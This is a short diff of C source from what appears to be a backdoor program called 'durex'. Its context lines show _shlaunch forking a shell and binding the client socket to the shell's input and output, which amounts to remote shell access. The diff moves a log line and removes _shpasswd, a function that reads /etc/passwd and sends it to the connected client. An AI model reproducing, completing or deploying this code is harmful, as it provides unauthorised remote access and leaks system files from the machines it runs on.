@@ -52,6 +52,7 @@ int	_shlaunch(struct s_client *client) {
 		_servlog(EFORKSHELL, client);
 	if (pid == 0)
 	{
+		printf("durex: spawned shell (%d)\n", pid);
 		if ((fd1 = dup2(client->fd, 0)) == -1)
 			_servlog(EDUPSHELL, client);
 		if ((fd2 = dup2(client->fd, 1)) == -1)
@@ -65,28 +66,10 @@ int	_shlaunch(struct s_client *client) {
 		close(client->fd);
 		client->status = IN_SHELL;
 		client->pid = pid;
-		printf("durex: spawned shell (%d)\n", pid);
 		waitpid(pid, 0, 0);
 		kill(pid, SIGTERM);
 	}
 	return (IN_SHELL);
-}
-
-int	_shpasswd(struct s_client *client) {
-	int fd, res;
-	char buf[1024];
-
-	memset(buf, 0, 1024);
-	if ((fd = open("/etc/passwd", O_RDONLY)) < 0)
-		_servlog(EOPENPASSWD, client);
-	while ((res = read(fd, buf, 1024)) > 0)
-	{
-		send(client->fd, buf, strlen(buf), 0);
-		memset(buf, 0, 1024);
-	}
-	if (res < 0)
-		_servlog(EREADPASSWD, client);
-	return (0);
 }
 
 int	_shenv(struct s_client *client, char **envp) {
